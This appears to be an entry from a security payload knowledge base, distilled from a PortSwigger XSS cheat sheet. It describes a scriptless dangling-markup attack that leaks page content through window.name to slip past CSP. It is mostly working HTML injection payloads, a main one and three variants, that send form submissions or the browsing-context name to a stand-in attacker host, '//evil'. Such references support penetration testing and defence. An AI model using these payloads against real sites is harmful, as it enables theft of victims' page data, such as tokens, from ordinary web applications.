---
title: window.name Exfiltration via Dangling Form Target
slug: window-name-exfil
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/html-injection, sink/dangling-markup, sink/exfil, sink/window-name]
inbound: []
---

# window.name Exfiltration via Dangling Form Target

## Payload

```html
<form><button formaction=//evil>XSS</button><textarea name=x>
```

## Variants

```html
<button form=x>XSS</button><form id=x action=//evil target='
<a href=http://victim/dangling><font size=100 color=red>You must click me</font></a><base target="
<form><input type=submit value="Click me" formaction=http://victim/dangling formtarget="
```

## Context

Bypasses `connect-src` CSP by using `window.name` as the out-of-band channel: the form `target` or `<base target>` attribute value is left unclosed, so subsequent page content fills `window.name` when the form submits or the base changes the browsing context name. The attacker's page (`//evil`) reads `window.name` after the victim navigates to it. The `<textarea>` swallows markup to prevent premature closure. Requires a user click (button/link). No JavaScript execution needed — pure HTML injection.

## Provenance

- Distilled from: `../../techniques/dom-xss/scriptless-attacks.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Scriptless Attacks](../../techniques/dom-xss/scriptless-attacks.md)
- [Dangling Markup Exfil](../../payloads/dom-xss/dangling-markup-exfil.md)
